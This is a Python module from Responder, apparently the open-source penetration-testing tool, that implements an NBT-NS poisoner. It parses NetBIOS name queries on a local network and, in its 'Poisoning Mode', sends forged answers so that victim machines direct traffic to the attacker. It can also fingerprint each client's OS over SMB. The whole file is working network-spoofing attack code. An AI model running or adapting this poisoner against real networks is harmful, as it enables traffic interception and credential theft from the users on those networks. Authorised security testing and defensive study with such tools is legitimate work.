#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import fingerprint

from packets import NBT_Ans as NBTNS_Ans
import socketserver
from utils import *

def Parse_NBTNS_Name(data):
	NameLen = 32
	EncodedName = data[12:12+NameLen]
	DecodedName = ''
	for i in range(0, len(EncodedName), 2):
		char_code = EncodedName[i]
		if not isinstance(char_code, int):
			char_code = ord(char_code)
		char_code2 = EncodedName[i+1]
		if not isinstance(char_code2, int):
			char_code2 = ord(char_code2)
		DecodedName += chr((char_code - 0x41) << 4 | (char_code2 - 0x41))
	return DecodedName.strip().rstrip('\x00')

class NBTNS(socketserver.BaseRequestHandler):  # NBTNS Server class
	def handle(self):
		data, soc = self.request
		
		# Break out if we don't want to respond to this host
		Name = Parse_NBTNS_Name(data)
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == b"\x01\x10" or data[2:4] == b"\x01\x00":
			if settings.Config.Wredirect is False and data[len(data)-6:len(data)-4] == b"\x00\x1c":
				return None
			if settings.Config.NBTNSDomain is False and data[len(data)-6:len(data)-4] == b"\x00\x1b":
				return None
			
			Finger = None
			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))

			if settings.Config.AnalyzeMode:
				LineHeader = "[Analyze mode: NBT-NS]"
				print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
			else:  # Poisoning Mode
				Buffer = NBTNS_Ans(Tid=data[0:2], QuestionName=data[12:44], QuestionType=data[44:46], QuestionClass=data[46:48])
				Buffer.calculate()
				soc.sendto(bytes(Buffer), self.client_address)
				LineHeader = "[*] [NBT-NS]"
				print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1))

			if Finger is not None:
				print(text("[FINGER] OS Version       : %s" % color(Finger[0], 3)))
				print(text("[FINGER] Client Version : %s" % color(Finger[1], 3)))
